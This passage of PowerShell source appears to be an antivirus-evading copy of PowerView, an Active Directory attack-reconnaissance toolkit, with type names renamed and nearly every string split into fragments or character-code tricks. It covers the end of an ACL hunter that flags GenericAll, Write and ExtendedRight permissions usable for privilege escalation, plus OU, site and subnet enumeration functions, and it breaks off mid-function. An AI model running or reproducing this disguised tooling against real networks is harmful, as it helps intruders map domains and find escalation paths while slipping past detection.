    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'ould'+'Pr'+'oce'+'ss'), '')]
    [OutputType(('P'+'ow'+'erBla'+'.ACL'))]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Domai'+'nN'+'a'+'me'), ('Na'+'me'))]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet(('A'+'ll'), ('R'+'esetPas'+'swo'+'rd'), ('Writ'+'eMe'+'m'+'bers'))]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fi'+'lter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADS'+'Pa'+'th'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Doma'+'in'+'Cont'+'roll'+'er'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('O'+'neLev'+'el'), ('Subtr'+'e'+'e'))]
        [String]
        $SearchScope = ('Sub'+'tree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters[('Resolv'+'eG'+'UID'+'s')]) { $ACLArguments[('Res'+'olveGU'+'IDs')] = $ResolveGUIDs }
        if ($PSBoundParameters[('Right'+'sFilte'+'r')]) { $ACLArguments[('Ri'+'gh'+'tsFilter')] = $RightsFilter }
        if ($PSBoundParameters[('LDAPFil'+'t'+'er')]) { $ACLArguments[('LD'+'A'+'PFilter')] = $LDAPFilter }
        if ($PSBoundParameters[('Search'+'B'+'ase')]) { $ACLArguments[('Sear'+'ch'+'Base')] = $SearchBase }
        if ($PSBoundParameters[('Ser'+'ver')]) { $ACLArguments[('Se'+'rver')] = $Server }
        if ($PSBoundParameters[('S'+'ear'+'chScop'+'e')]) { $ACLArguments[('S'+'earch'+'Scope')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'sultPageS'+'ize')]) { $ACLArguments[('Re'+'sult'+'PageS'+'i'+'ze')] = $ResultPageSize }
        if ($PSBoundParameters[('Server'+'T'+'ime'+'Limi'+'t')]) { $ACLArguments[('Serv'+'e'+'rTim'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tomb'+'stone')]) { $ACLArguments[('To'+'mbst'+'on'+'e')] = $Tombstone }
        if ($PSBoundParameters[('Creden'+'t'+'ia'+'l')]) { $ACLArguments[('Crede'+'n'+'tial')] = $Credential }

        $ObjectSearcherArguments = @{
            ('Proper'+'ti'+'es') = ('samacc'+'ount'+'na'+'me,o'+'b'+'jec'+'tcl'+'ass')
            ('R'+'aw') = $True
        }
        if ($PSBoundParameters[('Ser'+'ver')]) { $ObjectSearcherArguments[('Ser'+'ver')] = $Server }
        if ($PSBoundParameters[('SearchSc'+'o'+'pe')]) { $ObjectSearcherArguments[('Se'+'ar'+'chScope')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'ul'+'tPageSiz'+'e')]) { $ObjectSearcherArguments[('Re'+'s'+'ul'+'tPageSi'+'ze')] = $ResultPageSize }
        if ($PSBoundParameters[('Serv'+'erTime'+'Li'+'mit')]) { $ObjectSearcherArguments[('ServerTim'+'eLi'+'mi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('T'+'ombs'+'tone')]) { $ObjectSearcherArguments[('Tombsto'+'n'+'e')] = $Tombstone }
        if ($PSBoundParameters[('Cre'+'d'+'en'+'tial')]) { $ObjectSearcherArguments[('C'+'rede'+'nt'+'ial')] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters[('Ser'+'ve'+'r')]) { $ADNameArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('Cr'+'eden'+'tial')]) { $ADNameArguments[('Cr'+'edent'+'ial')] = $Credential }

        $ResolvedSIDs = @{}
    }

    PROCESS {
        if ($PSBoundParameters[('Do'+'main')]) {
            $ACLArguments[('D'+'omain')] = $Domain
            $ADNameArguments[('Doma'+'in')] = $Domain
        }

        &('Ge'+'t-DomainOb'+'jectA'+'cl') @ACLArguments | &('Fo'+'rEa'+'ch-Object') {

            if ( ($_.ActiveDirectoryRights -match (('Gen'+'e'+'ri'+'cA'+'ll{0}'+'W'+'r'+'ite'+'{'+'0}C'+'reate{0}D'+'elete')-F  [ChAR]124)) -or (($_.ActiveDirectoryRights -match ('Exten'+'de'+'d'+'Right')) -and ($_.AceQualifier -match ('Allo'+'w')))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]

                        $InterestingACL = &('New-'+'Ob'+'ject') PSObject
                        $InterestingACL | &('Add-Me'+'m'+'ber') NoteProperty ('O'+'bject'+'DN') $_.ObjectDN
                        $InterestingACL | &('A'+'dd-'+'Me'+'mber') NoteProperty ('A'+'ceQual'+'i'+'fier') $_.AceQualifier
                        $InterestingACL | &('Add-Mem'+'be'+'r') NoteProperty ('Ac'+'t'+'iveD'+'ir'+'ec'+'toryRights') $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | &('A'+'dd-M'+'ember') NoteProperty ('Obj'+'e'+'ct'+'AceTy'+'pe') $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | &('Add-M'+'embe'+'r') NoteProperty ('Obj'+'ectAce'+'Type') ('N'+'one')
                        }
                        $InterestingACL | &('Add-M'+'emb'+'er') NoteProperty ('Ace'+'Flags') $_.AceFlags
                        $InterestingACL | &('Add-Mem'+'b'+'er') NoteProperty ('Ace'+'Typ'+'e') $_.AceType
                        $InterestingACL | &('Add-'+'M'+'ember') NoteProperty ('Inh'+'erit'+'an'+'ce'+'Flags') $_.InheritanceFlags
                        $InterestingACL | &('Add-M'+'embe'+'r') NoteProperty ('Sec'+'u'+'rity'+'Identifi'+'er') $_.SecurityIdentifier
                        $InterestingACL | &('A'+'dd-Me'+'mber') NoteProperty ('Ident'+'ity'+'R'+'e'+'ferenceName') $IdentityReferenceName
                        $InterestingACL | &('A'+'d'+'d-Member') NoteProperty ('I'+'den'+'tity'+'ReferenceDom'+'ain') $IdentityReferenceDomain
                        $InterestingACL | &('A'+'dd-Membe'+'r') NoteProperty ('Ide'+'nt'+'i'+'tyRef'+'erence'+'D'+'N') $IdentityReferenceDN
                        $InterestingACL | &('A'+'dd-Memb'+'er') NoteProperty ('Ide'+'ntityRe'+'fe'+'r'+'enceCl'+'as'+'s') $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = &('C'+'onver'+'t-AD'+'Name') -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments

                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf(('D'+'C='))) -replace ('D'+'C='),'' -replace ',','.'
                            $ObjectSearcherArguments[('Doma'+'i'+'n')] = $IdentityReferenceDomain
                            $ObjectSearcherArguments[('I'+'denti'+'ty')] = $IdentityReferenceDN
                            $Object = &('G'+'et-Doma'+'in'+'Obje'+'ct') @ObjectSearcherArguments

                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match ('co'+'mp'+'uter')) {
                                    $IdentityReferenceClass = ('co'+'mputer')
                                }
                                elseif ($Object.Properties.objectclass -match ('grou'+'p')) {
                                    $IdentityReferenceClass = ('grou'+'p')
                                }
                                elseif ($Object.Properties.objectclass -match ('us'+'er')) {
                                    $IdentityReferenceClass = ('us'+'er')
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }

                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL = &('N'+'ew-Ob'+'ject') PSObject
                                $InterestingACL | &('Ad'+'d'+'-Member') NoteProperty ('O'+'bj'+'ectDN') $_.ObjectDN
                                $InterestingACL | &('Add-'+'Memb'+'er') NoteProperty ('AceQualifi'+'e'+'r') $_.AceQualifier
                                $InterestingACL | &('Add-'+'Membe'+'r') NoteProperty ('Activ'+'eDi'+'re'+'ct'+'o'+'ryRi'+'ghts') $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | &('Add'+'-Me'+'mb'+'er') NoteProperty ('Ob'+'jec'+'tAc'+'eType') $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | &('Add-M'+'e'+'mber') NoteProperty ('Ob'+'j'+'ectAceTy'+'p'+'e') ('N'+'one')
                                }
                                $InterestingACL | &('Ad'+'d-M'+'emb'+'er') NoteProperty ('AceFla'+'g'+'s') $_.AceFlags
                                $InterestingACL | &('A'+'dd-Memb'+'er') NoteProperty ('Ac'+'eTyp'+'e') $_.AceType
                                $InterestingACL | &('Add-Me'+'mbe'+'r') NoteProperty ('Inh'+'eritanc'+'eF'+'lags') $_.InheritanceFlags
                                $InterestingACL | &('A'+'dd-M'+'ember') NoteProperty ('SecurityIdenti'+'f'+'i'+'er') $_.SecurityIdentifier
                                $InterestingACL | &('A'+'dd'+'-Member') NoteProperty ('I'+'dentity'+'Refer'+'en'+'ceNa'+'me') $IdentityReferenceName
                                $InterestingACL | &('A'+'dd'+'-Me'+'mber') NoteProperty ('Ident'+'ityRefere'+'n'+'ceD'+'om'+'ain') $IdentityReferenceDomain
                                $InterestingACL | &('Ad'+'d-'+'Member') NoteProperty ('I'+'denti'+'t'+'yR'+'efer'+'enceDN') $IdentityReferenceDN
                                $InterestingACL | &('Add'+'-Mem'+'b'+'er') NoteProperty ('Id'+'e'+'nt'+'ityRe'+'ferenceC'+'lass') $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            &('Writ'+'e'+'-Warnin'+'g') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'S'+'ho'+'uldP'+'rocess'), '')]
    [OutputType(('PowerBl'+'a.'+'OU'))]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Na'+'me'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias(('GU'+'ID'))]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'i'+'lter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSP'+'at'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('DomainC'+'o'+'ntroll'+'er'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('OneLe'+'vel'), ('Subt'+'ree'))]
        [String]
        $SearchScope = ('Subt'+'ree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('Da'+'cl'), ('Grou'+'p'), ('Non'+'e'), ('O'+'wner'), ('S'+'acl'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(('R'+'eturnOn'+'e'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[('D'+'omain')]) { $SearcherArguments[('Dom'+'ain')] = $Domain }
        if ($PSBoundParameters[('Pro'+'pert'+'ies')]) { $SearcherArguments[('Prope'+'rtie'+'s')] = $Properties }
        if ($PSBoundParameters[('Se'+'arc'+'hBase')]) { $SearcherArguments[('S'+'ea'+'rchBa'+'se')] = $SearchBase }
        if ($PSBoundParameters[('S'+'e'+'rver')]) { $SearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('S'+'earchS'+'cope')]) { $SearcherArguments[('S'+'ear'+'chScope')] = $SearchScope }
        if ($PSBoundParameters[('Resu'+'ltPag'+'eS'+'ize')]) { $SearcherArguments[('R'+'esult'+'PageSi'+'z'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('Server'+'T'+'ime'+'Limit')]) { $SearcherArguments[('S'+'erverTim'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('S'+'e'+'curityMasks')]) { $SearcherArguments[('Sec'+'u'+'r'+'ityMasks')] = $SecurityMasks }
        if ($PSBoundParameters[('Tom'+'bs'+'tone')]) { $SearcherArguments[('To'+'mbs'+'tone')] = $Tombstone }
        if ($PSBoundParameters[('C'+'red'+'ential')]) { $SearcherArguments[('Creden'+'ti'+'a'+'l')] = $Credential }
        $OUSearcher = &('Get-D'+'o'+'ma'+'in'+'S'+'earcher') @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | &('Wh'+'ere-'+'Ob'+'ject') {$_} | &('F'+'o'+'rE'+'ach-'+'Object') {
                $IdentityInstance = $_.Replace('(', (('Cs'+'128')-rEplaCe ([ChAr]67+[ChAr]115+[ChAr]49),[ChAr]92)).Replace(')', (('xlR'+'2'+'9').REplACE('xlR',[sTRIng][chAr]92)))
                if ($IdentityInstance -match ('^'+'OU=.*')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[('Dom'+'ai'+'n')]) -and (-not $PSBoundParameters[('S'+'e'+'archBase')])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('DC'+'='))) -replace ('D'+'C='),'' -replace ',','.'
                        &('Writ'+'e-V'+'e'+'rbose') ('[Get-Do'+'mainO'+'U'+'] '+'Extra'+'c'+'ted '+'d'+'omain'+' '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        $SearcherArguments[('Do'+'main')] = $IdentityDomain
                        $OUSearcher = &('Get'+'-Dom'+'ainSearche'+'r') @SearcherArguments
                        if (-not $OUSearcher) {
                            &('Write-Warn'+'i'+'ng') ('[G'+'et-Domai'+'nO'+'U] '+'Una'+'b'+'le '+'t'+'o '+'re'+'tr'+'ieve'+' '+'d'+'o'+'main '+'sea'+'r'+'cher '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | &('ForEach-'+'Obj'+'ec'+'t') {$_.ToString('X').PadLeft(2,'0')})) -Replace ('(..'+')'),(('{1'+'}{0}'+'1') -F  [chaR]36,[chaR]92)
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[('GPL'+'ink')]) {
                &('W'+'rite-'+'Ver'+'bose') ('['+'Get-Do'+'m'+'ainOU] '+'Sea'+'rching'+' '+'for'+' '+'OUs'+' '+'with'+' '+"$GPLink "+'set'+' '+'in'+' '+'th'+'e '+'g'+'pLink '+'p'+'roperty')
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters[('LDAP'+'Fil'+'ter')]) {
                &('Write-V'+'e'+'r'+'bose') ('['+'Get-D'+'omainO'+'U] '+'U'+'sing '+'add'+'i'+'tional '+'L'+'DAP '+'filter'+':'+' '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            &('Wr'+'ite-Verbo'+'se') "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter) "

            if ($PSBoundParameters[('Fin'+'d'+'One')]) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | &('Wh'+'ere-Ob'+'je'+'ct') {$_} | &('For'+'Each-O'+'bje'+'ct') {
                if ($PSBoundParameters[('Ra'+'w')]) {
                    $OU = $_
                }
                else {
                    $OU = &('Convert-'+'LDAPPr'+'o'+'per'+'ty') -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, ('PowerBl'+'a.'+'OU'))
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('Wr'+'ite'+'-V'+'erbo'+'se') ('['+'Get-'+'D'+'omainOU]'+' '+'Er'+'ror'+' '+'dis'+'posi'+'n'+'g '+'of'+' '+'th'+'e '+'Result'+'s'+' '+'obj'+'ect:'+' '+"$_")
                }
            }
            $OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SSh'+'oul'+'d'+'Process'), '')]
    [OutputType(('P'+'ow'+'erBla.S'+'ite'))]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('N'+'ame'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias(('GUI'+'D'))]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fil'+'t'+'er'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('A'+'D'+'SPath'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('D'+'oma'+'inContro'+'ller'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('On'+'eLeve'+'l'), ('Subtr'+'e'+'e'))]
        [String]
        $SearchScope = ('Subt'+'ree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('Dac'+'l'), ('Gro'+'up'), ('No'+'ne'), ('Own'+'er'), ('Sa'+'cl'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(('R'+'etur'+'nOne'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ('S'+'earchBasePre'+'f'+'ix') = ('CN=Sites,C'+'N=Co'+'n'+'f'+'i'+'gura'+'tion')
        }
        if ($PSBoundParameters[('Domai'+'n')]) { $SearcherArguments[('Domai'+'n')] = $Domain }
        if ($PSBoundParameters[('Pr'+'ope'+'r'+'ties')]) { $SearcherArguments[('Prope'+'r'+'ties')] = $Properties }
        if ($PSBoundParameters[('S'+'ear'+'chBase')]) { $SearcherArguments[('S'+'earchBa'+'se')] = $SearchBase }
        if ($PSBoundParameters[('Ser'+'ver')]) { $SearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('S'+'earchScop'+'e')]) { $SearcherArguments[('S'+'ea'+'r'+'chScope')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'sult'+'PageSi'+'z'+'e')]) { $SearcherArguments[('R'+'esult'+'Page'+'Size')] = $ResultPageSize }
        if ($PSBoundParameters[('Serv'+'erTime'+'Li'+'mit')]) { $SearcherArguments[('Serve'+'r'+'Time'+'Limi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Sec'+'urityMa'+'sks')]) { $SearcherArguments[('Secu'+'rityMas'+'ks')] = $SecurityMasks }
        if ($PSBoundParameters[('T'+'ombst'+'one')]) { $SearcherArguments[('To'+'m'+'bstone')] = $Tombstone }
        if ($PSBoundParameters[('C'+'redenti'+'al')]) { $SearcherArguments[('Cred'+'en'+'tial')] = $Credential }
        $SiteSearcher = &('Get-Doma'+'in'+'Sea'+'rc'+'her') @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | &('Wh'+'ere'+'-'+'Object') {$_} | &('For'+'Eac'+'h-Ob'+'je'+'ct') {
                $IdentityInstance = $_.Replace('(', (('{0}2'+'8') -f [chaR]92)).Replace(')', (('{'+'0}29') -F  [CHAR]92))
                if ($IdentityInstance -match ('^CN='+'.*')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[('D'+'o'+'main')]) -and (-not $PSBoundParameters[('Searc'+'h'+'Ba'+'se')])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('D'+'C='))) -replace ('D'+'C='),'' -replace ',','.'
                        &('W'+'rit'+'e-Verb'+'ose') ('[Ge'+'t-'+'Domain'+'Sit'+'e] '+'Ext'+'racted'+' '+'d'+'om'+'ain '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        $SearcherArguments[('Do'+'mai'+'n')] = $IdentityDomain
                        $SiteSearcher = &('Get'+'-Do'+'ma'+'inSearcher') @SearcherArguments
                        if (-not $SiteSearcher) {
                            &('Wr'+'it'+'e-Warn'+'ing') ('[Get-Do'+'m'+'ainS'+'ite'+'] '+'Una'+'ble '+'t'+'o '+'retriev'+'e'+' '+'domai'+'n '+'se'+'ar'+'cher '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | &('ForEach'+'-'+'Obje'+'ct') {$_.ToString('X').PadLeft(2,'0')})) -Replace ('(..'+')'),(('m'+'2ic8D1').rEplACe('m2i',[stRinG][chaR]92).rEplACe('c8D','$'))
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[('G'+'PLink')]) {
                &('Write-'+'Ve'+'rbo'+'se') ('['+'Get-D'+'omainSit'+'e] '+'Sear'+'chin'+'g '+'f'+'or '+'site'+'s'+' '+'w'+'ith '+"$GPLink "+'set'+' '+'in'+' '+'t'+'he '+'gp'+'Link'+' '+'pro'+'p'+'erty')
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters[('L'+'DAPFilt'+'er')]) {
                &('Write-Ver'+'bo'+'se') ('[G'+'et'+'-Domai'+'n'+'Sit'+'e] '+'Us'+'ing'+' '+'addi'+'tion'+'al'+' '+'LD'+'AP '+'filter:'+' '+"$LDAPFilter")
                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            &('Wr'+'ite'+'-'+'Verbose') "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter) "

            if ($PSBoundParameters[('F'+'indOn'+'e')]) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | &('Whe'+'r'+'e-Object') {$_} | &('Fo'+'rEach-Ob'+'je'+'ct') {
                if ($PSBoundParameters[('Ra'+'w')]) {
                    $Site = $_
                }
                else {
                    $Site = &('C'+'o'+'n'+'ver'+'t-LDA'+'PProperty') -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, ('Po'+'werB'+'la'+'.Site'))
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    &('Writ'+'e-Verb'+'ose') ('[G'+'e'+'t-Dom'+'ain'+'Si'+'t'+'e] E'+'r'+'ror disposing of th'+'e Re'+'sults'+' object')
                }
            }
            $SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SShou'+'ldPro'+'cess'), '')]
    [OutputType(('P'+'o'+'werBla'+'.Su'+'bnet'))]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Nam'+'e'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilte'+'r'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('AD'+'SPa'+'th'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'a'+'in'+'C'+'ontroller'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('One'+'L'+'evel'), ('Sub'+'tree'))]
        [String]
        $SearchScope = ('S'+'u'+'btree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet(('D'+'acl'), ('Grou'+'p'), ('No'+'ne'), ('Own'+'er'), ('Sac'+'l'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(('R'+'eturn'+'One'))]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ('Sea'+'rchBas'+'ePrefi'+'x') = ('CN'+'=Subnet'+'s'+',CN=Si'+'tes,CN'+'=C'+'onf'+'i'+'gurat'+'i'+'on')
        }
        if ($PSBoundParameters[('Do'+'main')]) { $SearcherArguments[('D'+'omain')] = $Domain }
        if ($PSBoundParameters[('Pro'+'pert'+'ies')]) { $SearcherArguments[('Pr'+'op'+'erti'+'es')] = $Properties }
        if ($PSBoundParameters[('Sea'+'rc'+'hBase')]) { $SearcherArguments[('Se'+'archBas'+'e')] = $SearchBase }
        if ($PSBoundParameters[('Se'+'rve'+'r')]) { $SearcherArguments[('Serve'+'r')] = $Server }
        if ($PSBoundParameters[('Search'+'Scop'+'e')]) { $SearcherArguments[('Sear'+'chSco'+'pe')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'sultPageS'+'ize')]) { $SearcherArguments[('Re'+'su'+'ltPageSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Se'+'rve'+'rT'+'imeLimit')]) { $SearcherArguments[('Ser'+'v'+'erTim'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('S'+'ecurit'+'yMasks')]) { $SearcherArguments[('S'+'ecurit'+'yMasks')] = $SecurityMasks }
        if ($PSBoundParameters[('T'+'ombston'+'e')]) { $SearcherArguments[('Tom'+'bsto'+'ne')] = $Tombstone }
        if ($PSBoundParameters[('Cre'+'dent'+'ia'+'l')]) { $SearcherArguments[('Cred'+'en'+'tial')] = $Credential }
        $SubnetSearcher = &('G'+'et-'+'DomainSe'+'arch'+'er') @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | &('Wher'+'e-Obje'+'c'+'t') {$_} | &('Fo'+'rEac'+'h-Ob'+'je'+'ct') {
                $IdentityInstance = $_.Replace('(', (('PtM'+'28')-rePLAcE  ([char]80+[char]116+[char]77),[char]92)).Replace(')', (('{0'+'}29')-f [cHAr]92))
                if ($IdentityInstance -match ('^CN=.'+'*')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[('Doma'+'i'+'n')]) -and (-not $PSBoundParameters[('S'+'e'+'archB'+'ase')])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(('DC'+'='))) -replace ('D'+'C='),'' -replace ',','.'
                        &('W'+'rit'+'e-Ve'+'rbos'+'e') ('[G'+'et-D'+'o'+'m'+'ainSubnet] '+'Ex'+'trac'+'ted '+'d'+'oma'+'in '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        $SearcherArguments[('D'+'oma'+'in')] = $IdentityDomain
                        $SubnetSearcher = &('Get-Dom'+'ainSea'+'rch'+'er') @SearcherArguments
                        if (-not $SubnetSearcher) {
                            &('W'+'r'+'it'+'e-Warning') ('[Get-DomainSu'+'b'+'net'+']'+' '+'Unabl'+'e '+'to'+' '+'re'+'trieve'+' '+'dom'+'ai'+'n '+'search'+'er '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | &('F'+'orEa'+'c'+'h-Ob'+'ject') {$_.ToString('X').PadLeft(2,'0')})) -Replace ('('+'..)'),((('d'+'fjLqs1')-RePlace 'dfj',[ChAr]92 -RePlace  ([ChAr]76+[ChAr]113+[ChAr]115),[ChAr]36))
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[('LD'+'AP'+'Filter')]) {
